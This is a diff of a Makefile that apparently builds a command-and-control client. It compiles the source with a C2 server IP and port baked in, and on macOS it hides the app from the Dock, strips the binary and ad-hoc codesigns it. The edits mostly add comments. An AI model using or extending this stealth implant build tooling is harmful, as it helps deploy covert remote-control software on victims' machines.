@@ -49,7 +49,7 @@ endif
 
 
 all: $(SRC)
-ifeq ($(OS),Windows_NT)
+ifeq ($(OS),Windows_NT) # Windows
 	$(eval $(call wininput))
 	@cmd /c erase /f /q .\.nn .\nn
 ifneq ($(findstring Microsoft,$(shell $(CC) /? 2>&1)),) # Microsoft Visual Studio (MSVC)
@@ -69,12 +69,12 @@ endif
 
 
 
-ifeq ($(shell uname -s),Linux)
+ifeq ($(shell uname -s),Linux) # Linux
 	$(eval $(call uninput))
 	@sh -c rm -rf ./nn
 	$(CC) $(SRC) -o $(BIN) -Os -s -lpthread -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
 endif
-ifeq ($(findstring Darwin,$(shell uname -s)),Darwin)
+ifeq ($(findstring Darwin,$(shell uname -s)),Darwin) # macOS(Darwin)
 	$(eval $(call uninput))
 	@sh -c rm -rf ./nn
 	@printf '<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict><key>LSUIElement</key><true/></dict></plist>' > temp.plist
@@ -97,8 +97,8 @@ ifeq ($(findstring Darwin,$(shell uname -s)),Darwin)
 	@strip $(BIN) 2>/dev/null || true
 	@codesign -s - --force $(BIN) 2>/dev/null || true
 endif
-ifeq ($(shell uname -s),BSD)
-	$(eval $(call uninput))
+ifeq ($(shell uname -s),BSD) # BSD
+		$(eval $(call uninput))
 	@sh -c rm -rf ./nn
 	$(CC) $(SRC) -o $(BIN) -Os -s -lpthread -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
 endif
@@ -106,7 +106,7 @@ endif
 
 clean:
 ifeq ($(OS),Windows_NT)
-	cmd /c erase /f /q $(BIN) $(BIN).*
+	cmd $(P)/c erase $(P)/f $(P)/q $(BIN) $(BIN).*
 else
 	sh -c "rm -rf $(BIN) $(BIN).*"
 endif
